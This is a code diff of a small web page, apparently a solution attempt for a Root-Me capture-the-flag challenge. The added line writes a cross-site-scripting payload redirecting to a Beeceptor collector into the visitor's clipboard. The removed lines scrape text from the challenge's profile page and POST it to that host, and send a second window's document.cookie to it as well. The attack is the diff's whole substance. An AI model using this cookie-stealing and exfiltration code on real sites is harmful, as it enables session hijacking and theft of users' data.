@@ -10,36 +10,13 @@
   <script>
     
   // Ouvrir une nouvelle fenêtre
+navigator.clipboard.writeText("<script>document.location=https://volatile.free.beeceptor.com</script>")
 const newWindow = window.open('http://challenge01.root-me.org:58003/profile');
 
 // Attendre 1 seconde avant d'exécuter le reste du code
 setTimeout(() => {
   if (newWindow) {
     try {
-      /*
-      // Récupérer tous les paragraphes de la nouvelle fenêtre
-      const paragraphs = newWindow.document.querySelectorAll('p');
-      let text = "";
-      
-      paragraphs.forEach(paragraph => {
-        text += paragraph.textContent + "\n";
-      });
-      
-      // Envoyer les données au serveur
-      fetch("https://volatile.free.beeceptor.com", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ text })
-      })
-      .then(response => response.json())
-      .then(data => console.log('Réponse du serveur:', data))
-      .catch(error => console.error('Erreur lors de la requête:', error));
-      */
-    const newWindow2 = window.open('http://challenge01.root-me.org:58003/profile');
-    //console.log(newWindow2.document.cookie)
-    setTimeout(() => { newWindow.location = "https://volatile.free.beeceptor.com/c?" + newWindow2.document.cookie} , 1000)
         
     } catch (error) {
       console.error('Erreur lors de l\'accès au contenu:', error);
